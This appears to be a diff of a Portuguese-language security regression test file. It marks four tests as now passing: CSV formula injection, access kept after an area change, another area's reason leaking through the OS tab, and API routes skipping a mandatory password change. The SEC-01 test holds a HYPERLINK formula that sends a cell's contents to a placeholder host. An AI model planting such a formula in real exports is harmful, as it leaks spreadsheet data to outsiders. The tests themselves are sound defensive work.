@@ -70,7 +70,7 @@ describe("SEC-01 · CSV do histórico sem proteção contra fórmula (CSV inject
   // (csvEscape com prefixo "'"), esta não.
   const FORMULA = '=HYPERLINK("http://exemplo.invalido/?x="&A1,"Abrir")';
 
-  it.fails("a célula exportada não começa com = (texto vindo de um requisitante)", async () => {
+  it("a célula exportada não começa com = (texto vindo de um requisitante)", async () => {
     const ev = await novoEvento(E.logistica);
     await enviarSolicitacao(E.requisitante, E.admin, ev.id, [itemAvulso(FORMULA)]);
     const linha = (await obterLinhasAta(ev.id)).find((l) => l.registro.descricaoLivre === FORMULA);
@@ -92,7 +92,7 @@ describe("SEC-02 · Troca de área não tira o acesso à área antiga (areasPedi
   // A sessão soma à área do cadastro todas as áreas em que a pessoa já criou solicitação
   // (session.ts: areasPedidasSql). Quem muda de área (ou de empresa/setor) continua vendo e EDITANDO
   // rascunhos, solicitações, motivos da logística e linhas da ata da área antiga.
-  it.fails("requisitante movido da área A para a B não abre nem edita rascunho da área A", async () => {
+  it("requisitante movido da área A para a B não abre nem edita rascunho da área A", async () => {
     const ev = await novoEvento(E.logistica);
     const migrante = await criarUsuario("Requisitante que mudou de área", "REQUISITANTE", E.areas.a);
     await rascunho(migrante, ev.id); // pediu uma vez pela área A
@@ -116,7 +116,7 @@ describe("SEC-04 · Motivo da logística sobre item de outra área aparece na ab
   // motivo ("<item> 10 → 7 — <motivo>") e a aba OS (os.ver = todos) lista as versões sem filtro.
   const MOTIVO = "MOTIVO-SIGILOSO-DA-AREA-A";
 
-  it.fails("requisitante da área B não recebe, pela aba OS, o motivo de ajuste num item da área A", async () => {
+  it("requisitante da área B não recebe, pela aba OS, o motivo de ajuste num item da área A", async () => {
     const { criarPeca, eventoAberto } = await import("@/test/apoio");
     const { alterarQuantidadeLinha, obterHistoricoEvento } = await import("@/server/services/eventos");
     const { listarOsResumo } = await import("@/server/services/os");
@@ -128,7 +128,7 @@ describe("SEC-04 · Motivo da logística sobre item de outra área aparece na ab
     const historicoB = await obterHistoricoEvento(E.requisitanteB, ev.id);
     expect(historicoB.some((h) => h.descricao.includes(MOTIVO))).toBe(false);
     // ...mas a aba OS (eventos/[id]/os/page.tsx → listarOsResumo) entrega a descrição da versão a qualquer perfil.
-    const versoesNaAbaOs = await listarOsResumo(ev.id);
+    const versoesNaAbaOs = await listarOsResumo(ev.id, E.requisitanteB);
     expect(versoesNaAbaOs.some((v) => (v.descricao ?? "").includes(MOTIVO))).toBe(false);
   });
 });
@@ -137,7 +137,7 @@ describe("SEC-03 · Troca obrigatória de senha não vale nas rotas de API", { t
   // requireUsuario (páginas e actions) manda para /perfil?trocar=1; as rotas /api/** usam
   // getUsuarioAtual, que não olha trocarSenha. Quem entra com senha provisória baixa histórico,
   // OS e ata sem trocar a senha. (Nas actions, o caminho é o da página: POST em /perfil passa.)
-  it.fails("usuário com senha provisória recebe 401/403 no CSV do histórico", async () => {
+  it("usuário com senha provisória recebe 401/403 no CSV do histórico", async () => {
     const provisorio = await criarUsuario("Logística com senha provisória", "LOGISTICA", E.areas.logistica);
     const db = await getDb();
     await db.update(usuarios).set({ trocarSenha: true }).where(eq(usuarios.id, provisorio.id));
